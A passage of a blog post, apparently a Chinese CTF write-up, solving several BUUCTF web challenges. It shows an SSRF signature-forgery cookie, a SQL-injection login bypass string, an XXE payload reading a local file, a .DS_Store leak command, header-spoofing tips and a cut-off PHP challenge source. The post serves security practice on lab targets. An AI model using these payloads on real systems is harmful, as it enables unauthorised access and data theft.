@@ -1,0 +1,661 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>BUUCTF2 | Tcy👦♥QQ👧</title><meta name="keywords" content="寒假CTF DAY 01,BUUCTF,SSRF,http Header请求头,XML,Unicode等价性浅谈,PHP代码审计,代码执行(数学函数)"><meta name="author" content="uploads"><meta name="copyright" content="uploads"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="gogoggogogogogogogogogoggogogogogogod">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF2">
+<meta property="og:url" content="https://tanchiyu.top/2021/01/01/BUUCTF-2/index.html">
+<meta property="og:site_name" content="Tcy👦♥QQ👧">
+<meta property="og:description" content="gogoggogogogogogogogogoggogogogogogod">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://tanchiyu.top/image/ttt.jpg">
+<meta property="article:published_time" content="2021-01-01T06:57:42.000Z">
+<meta property="article:modified_time" content="2021-01-03T13:07:21.944Z">
+<meta property="article:author" content="uploads">
+<meta property="article:tag" content="寒假CTF DAY 01">
+<meta property="article:tag" content="BUUCTF">
+<meta property="article:tag" content="SSRF">
+<meta property="article:tag" content="http Header请求头">
+<meta property="article:tag" content="XML">
+<meta property="article:tag" content="Unicode等价性浅谈">
+<meta property="article:tag" content="PHP代码审计">
+<meta property="article:tag" content="代码执行(数学函数)">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://tanchiyu.top/image/ttt.jpg"><link rel="shortcut icon" href="/%E7%94%B7%E5%AD%A9.png"><link rel="canonical" href="https://tanchiyu.top/2021/01/01/BUUCTF-2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-01-03 21:07:21'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'true'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Tcy👦♥QQ👧" type="application/atom+xml">
+</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/image/pp.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">54</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">107</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/2.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Tcy👦♥QQ👧</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> ♥♥♥</span></a></div><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 娱乐</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">BUUCTF2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-01-01T06:57:42.000Z" title="发表于 2021-01-01 14:57:42">2021-01-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-01-03T13:07:21.944Z" title="更新于 2021-01-03 21:07:21">2021-01-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/BUUCTF/">BUUCTF</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>9分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6050</span><br><span class="line">https:&#x2F;&#x2F;www.jianshu.com&#x2F;p&#x2F;eb60c856f2a3</span><br><span class="line">看了看两位师傅的文章！感觉这到题好wl！！！！！</span><br><span class="line">Md5扩展长度攻击那点没看太懂！密码写的一塌糊涂！！！</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">大概流程就是python审计+Md5扩展长度攻击</span><br><span class="line"></span><br><span class="line">这个题就不回味了！我真吃不透！！</span><br></pre></td></tr></table></figure>
+
+<h4 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;geneSign?param&#x3D;flag.txt</span><br><span class="line">GET &#x2F;De1ta?param&#x3D;flag.txt </span><br><span class="line">Cookie: action&#x3D;readscan;    sign&#x3D;574d25eb12ce17aea8e501b9445e1696</span><br></pre></td></tr></table></figure>
+
+<h2 id="BJDCTF-2nd-假猪套天下第一"><a href="#BJDCTF-2nd-假猪套天下第一" class="headerlink" title="[BJDCTF 2nd]假猪套天下第一"></a>[BJDCTF 2nd]假猪套天下第一</h2><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210103210606.png" alt="image-20210101153301907"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">页面好熟悉呀！！</span><br><span class="line">不能因为页面熟悉就认为是一类题！！</span><br></pre></td></tr></table></figure>
+
+<p>看看能不能万能密码：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Hello, admin&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;1&#x2F;**&#x2F;#</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210103210607.png" alt="image-20210101153837624"></p>
+<p>好家伙：</p>
+<p>直接跳到大大大大大大大大大大大佬博客了！</p>
+<p><a target="_blank" rel="noopener" href="https://www.gem-love.com/">Y1ngyyds</a></p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210103210608.png" alt="image-20210101154058666"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">回来看了看好像不对</span><br><span class="line">好像啥都能登录！！</span><br></pre></td></tr></table></figure>
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210103210609.png" alt="image-20210101155240217"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bp抓包看下返回！！抓包查看信息，发现源代码有提示</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;!-- L0g1n.php --&gt;&lt;&#x2F;html&gt;</span><br><span class="line"></span><br><span class="line">这这我想不到呀！！</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210103210610.png" alt="image-20210101160810020"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_45521281&#x2F;article&#x2F;details&#x2F;105775452</span><br><span class="line">看了看大佬的文章！！又学到了点HTTP的内容！！！😄</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="http-header头"><a href="#http-header头" class="headerlink" title="http header头"></a>http header头</h4><table>
+<thead>
+<tr>
+<th>Header</th>
+<th>解释</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Accept</td>
+<td>指定客户端能够接收的内容类型</td>
+<td>Accept: text/plain, text/html,application/json</td>
+</tr>
+<tr>
+<td>Accept-Charset</td>
+<td>浏览器可以接受的字符编码集。</td>
+<td>Accept-Charset: iso-8859-5</td>
+</tr>
+<tr>
+<td>Accept-Encoding</td>
+<td>指定浏览器可以支持的web服务器返回内容压缩编码类型。</td>
+<td>Accept-Encoding: compress, gzip</td>
+</tr>
+<tr>
+<td>Accept-Language</td>
+<td>浏览器可接受的语言</td>
+<td>Accept-Language: en,zh</td>
+</tr>
+<tr>
+<td>Accept-Ranges</td>
+<td>可以请求网页实体的一个或者多个子范围字段</td>
+<td>Accept-Ranges: bytes</td>
+</tr>
+<tr>
+<td>Authorization</td>
+<td>HTTP授权的授权证书</td>
+<td>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td>
+</tr>
+<tr>
+<td>Cache-Control</td>
+<td>指定请求和响应遵循的缓存机制</td>
+<td>Cache-Control: no-cache</td>
+</tr>
+<tr>
+<td>Connection</td>
+<td>表示是否需要持久连接。（HTTP 1.1默认进行持久连接）</td>
+<td>Connection: close</td>
+</tr>
+<tr>
+<td>Cookie</td>
+<td>HTTP请求发送时，会把保存在该请求域名下的所有cookie值一起发送给web服务器。</td>
+<td>Cookie: $Version=1; Skin=new;</td>
+</tr>
+<tr>
+<td>Content-Length</td>
+<td>请求的内容长度</td>
+<td>Content-Length: 348</td>
+</tr>
+<tr>
+<td>Content-Type</td>
+<td>请求的与实体对应的MIME信息</td>
+<td>Content-Type: application/x-www-form-urlencoded</td>
+</tr>
+<tr>
+<td>Date</td>
+<td>请求发送的日期和时间</td>
+<td>Date: Tue, 15 Nov 2010 08:12:31 GMT</td>
+</tr>
+<tr>
+<td>Expect</td>
+<td>请求的特定的服务器行为</td>
+<td>Expect: 100-continue</td>
+</tr>
+<tr>
+<td>From</td>
+<td>发出请求的用户的Email</td>
+<td>From: <a href="mailto:&#x75;&#115;&#101;&#x72;&#64;&#x65;&#x6d;&#x61;&#105;&#108;&#x2e;&#99;&#111;&#109;">&#x75;&#115;&#101;&#x72;&#64;&#x65;&#x6d;&#x61;&#105;&#108;&#x2e;&#99;&#111;&#109;</a></td>
+</tr>
+<tr>
+<td>Host</td>
+<td>指定请求的服务器的域名和端口号</td>
+<td>Host: <a target="_blank" rel="noopener" href="http://www.zcmhi.com/">www.zcmhi.com</a></td>
+</tr>
+<tr>
+<td>If-Match</td>
+<td>只有请求内容与实体相匹配才有效</td>
+<td>If-Match: “737060cd8c284d8af7ad3082f209582d”</td>
+</tr>
+<tr>
+<td>If-Modified-Since</td>
+<td>如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回304代码</td>
+<td>If-Modified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td>
+</tr>
+<tr>
+<td>If-None-Match</td>
+<td>如果内容未改变返回304代码，参数为服务器先前发送的Etag，与服务器回应的Etag比较判断是否改变</td>
+<td>If-None-Match: “737060cd8c284d8af7ad3082f209582d”</td>
+</tr>
+<tr>
+<td>If-Range</td>
+<td>如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为Etag</td>
+<td>If-Range: “737060cd8c284d8af7ad3082f209582d”</td>
+</tr>
+<tr>
+<td>If-Unmodified-Since</td>
+<td>只在实体在指定时间之后未被修改才请求成功</td>
+<td>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</td>
+</tr>
+<tr>
+<td>Max-Forwards</td>
+<td>限制信息通过代理和网关传送的时间</td>
+<td>Max-Forwards: 10</td>
+</tr>
+<tr>
+<td>Pragma</td>
+<td>用来包含实现特定的指令</td>
+<td>Pragma: no-cache</td>
+</tr>
+<tr>
+<td>Proxy-Authorization</td>
+<td>连接到代理的授权证书</td>
+<td>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</td>
+</tr>
+<tr>
+<td>Range</td>
+<td>只请求实体的一部分，指定范围</td>
+<td>Range: bytes=500-999</td>
+</tr>
+<tr>
+<td>Referer</td>
+<td>先前网页的地址，当前请求网页紧随其后,即来路</td>
+<td>Referer: <a target="_blank" rel="noopener" href="http://www.zcmhi.com/archives/71.html">http://www.zcmhi.com/archives…</a></td>
+</tr>
+<tr>
+<td>TE</td>
+<td>客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</td>
+<td>TE: trailers,deflate;q=0.5</td>
+</tr>
+<tr>
+<td>Upgrade</td>
+<td>向服务器指定某种传输协议以便服务器进行转换（如果支持）</td>
+<td>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</td>
+</tr>
+<tr>
+<td>User-Agent</td>
+<td>User-Agent的内容包含发出请求的用户信息</td>
+<td>User-Agent: Mozilla/5.0 (Linux; X11)</td>
+</tr>
+<tr>
+<td>Via</td>
+<td>通知中间网关或代理服务器地址，通信协议</td>
+<td>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</td>
+</tr>
+<tr>
+<td>Warning</td>
+<td>关于消息实体的警告信息</td>
+<td>Warn: 199 Miscellaneous warning</td>
+</tr>
+</tbody></table>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 ds_store_exp.py http:&#x2F;&#x2F;node3.buuoj.cn:28699&#x2F;.DS_Store</span><br><span class="line"></span><br><span class="line">DS_Store泄露</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">大概总结一下啊：</span><br><span class="line">xff 使用XFF或者Client-ip绕过： 本地登录</span><br><span class="line">添加Referer头：来源</span><br><span class="line">添加User-agent头：浏览器</span><br><span class="line">添加From头：邮箱</span><br><span class="line">proxy 代理:Via</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="NCTF2019-Fake-XML-cookbook"><a href="#NCTF2019-Fake-XML-cookbook" class="headerlink" title="[NCTF2019]Fake XML cookbook"></a>[NCTF2019]Fake XML cookbook</h2><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210103210611.png" alt="image-20210101171433773"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">熟悉的页面！！！</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">考察点很明显！xxe</span><br><span class="line">有篇教程！</span><br><span class="line">https:&#x2F;&#x2F;xz.aliyun.com&#x2F;t&#x2F;6887</span><br><span class="line">XML注入和XPath注入。于是把XML注入、XPath注入和XML 外部实体注入</span><br><span class="line">什么是 XML？</span><br><span class="line">XML 指可扩展标记语言（EXtensible Markup Language）。</span><br><span class="line">XML 的设计宗旨是传输数据，而不是显示数据。</span><br><span class="line">XML 是 W3C 的推荐标准。</span><br><span class="line">XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。</span><br><span class="line">XML 语言没有预定义的标签。</span><br><span class="line"></span><br><span class="line">我以前的理解就是：前后端的语言不同，数据格式不一样！但是传输的过程为了前后端传输的数据都能识别，就写了xml来存储，传输数据！</span><br><span class="line">XML 不会做任何事情。XML 被设计用来结构化、存储以及传输信息。</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="直接payload："><a href="#直接payload：" class="headerlink" title="直接payload："></a>直接payload：</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">    &lt;!ENTITY test SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;flag&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;user&gt;&lt;username&gt;&amp;test;&lt;&#x2F;username&gt;&lt;password&gt;123&lt;&#x2F;password&gt;&lt;&#x2F;user&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="爬虫的包研究半天，一开始老是运行不了！"><a href="#爬虫的包研究半天，一开始老是运行不了！" class="headerlink" title="爬虫的包研究半天，一开始老是运行不了！"></a>爬虫的包研究半天，一开始老是运行不了！</h4><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1469188">Python3安装与使用urllib2包之小坑</a></p>
+<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210103210612.png" alt="image-20210101190955334"></p>
+<p>看了看了好像是什么Unicode安全问题！不是很懂！！</p>
+<p>但是这个题的意思就是要通过utf-8 表示一个大于1337.0的字符！</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://gitee.com/taochiyu/blogimage/raw/master/img/20210103210613.png" alt="image-20210101193854161"></p>
+<p>在把他们转成%的16进制传入！</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0xF0 0x90 0x85 0x96</span><br><span class="line">%F0%90%85%96</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h4><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5402">浅谈Unicode设计的安全性</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/">Unicode等价性浅谈</a></p>
+<p><a target="_blank" rel="noopener" href="http://unicode.org/reports/tr36/tr36-3.html#Numeric_Spoofs">UNICODE SECURITY CONSIDERATIONS</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode/">推荐一个搜Unicode的好地方</a></p>
+<h2 id="CISCN-2019-初赛-Love-Math"><a href="#CISCN-2019-初赛-Love-Math" class="headerlink" title="[CISCN 2019 初赛]Love Math"></a>[CISCN 2019 初赛]Love Math</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span 